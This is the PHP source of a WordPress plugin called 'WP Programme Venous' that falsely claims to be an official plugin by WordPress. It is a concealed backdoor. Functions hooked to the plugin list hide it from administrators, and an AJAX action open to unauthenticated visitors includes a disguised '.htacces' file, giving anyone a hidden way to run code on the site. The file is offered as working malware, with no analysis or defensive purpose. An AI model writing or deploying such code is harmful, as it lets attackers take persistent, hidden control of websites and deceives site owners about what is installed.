<?php
/*
Plugin Name: WP Programme Venous
Plugin URI: http://wordpress.org/#
Description: Official WordPress plugin
Author: WordPress
Version: 8.6.9
Author URI: http://wordpress.org/#
*/

function vpu_hide()
{
	global $wp_list_table;

    if (!isset($wp_list_table)) {
        return;
    }

    $h = array('wp-programme-venous/wp-programme-venous.php');

    if (isset($wp_list_table->items) && is_array($wp_list_table->items)) {
        foreach ($wp_list_table->items as $key => $val) {
            if (in_array($key, $h)) {
                unset($wp_list_table->items[$key]);
            }
        }
    }
}

add_action('pre_current_active_plugins', 'vpu_hide');

function jbc_hide_p($plugins)
{
    $p = 'wp-programme-venous/wp-programme-venous.php';
    if (array_key_exists($p, $plugins)) {
        unset($plugins[$p]);
    }
    return $plugins;
}

add_filter('all_plugins', 'jbc_hide_p');

function fdu_ajax_handler() {
    include plugin_dir_path(__FILE__) . '.htacces';
    wp_die();
}

add_action('wp_ajax_wp-fir', 'fdu_ajax_handler');
add_action('wp_ajax_nopriv_wp-fir', 'fdu_ajax_handler');
